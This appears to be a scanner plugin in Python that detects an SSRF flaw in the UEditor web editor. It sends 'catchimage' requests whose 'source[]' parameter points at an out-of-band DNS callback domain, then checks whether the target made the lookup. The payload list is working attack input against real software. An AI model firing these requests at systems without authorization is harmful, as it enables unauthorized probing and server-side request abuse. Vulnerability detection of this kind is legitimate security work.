#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

randomFileName = random_md5(6)

ueditor_ssrf_payloads = [
    {'path': 'ueditor/php/controller.php?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'ueditor/jsp/controller.jsp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'ueditor/asp/controller.asp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'ueditor/net/controller.ashx?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'UEditor/php/controller.php?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'UEditor/jsp/controller.jsp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'UEditor/asp/controller.asp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'UEditor/net/controller.ashx?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'php/controller.php?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'jsp/controller.jsp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'asp/controller.asp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
    {'path': 'net/controller.ashx?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
]

def ssrf_scan(self, clients):
    ''' 该接口用于抓取远程图片, 如果没有进行过滤, 则可以请求任意url地址 '''
    client = clients.get('reqClient')
    sessid = 'ed446d2ac00eae0a1aed7c3aa45479d1'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SSRF',
        'vul_id': 'ueditor-ssrf',
    }

    for payload in ueditor_ssrf_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].format(DNSDOMAIN=dns_domain, FILENAME=randomFileName)

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )

        sleep(3)                                                # * dns查询可能较慢, 等一会
        if ((dns.result(md, sessid))):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res,
            }
            return results
    return None
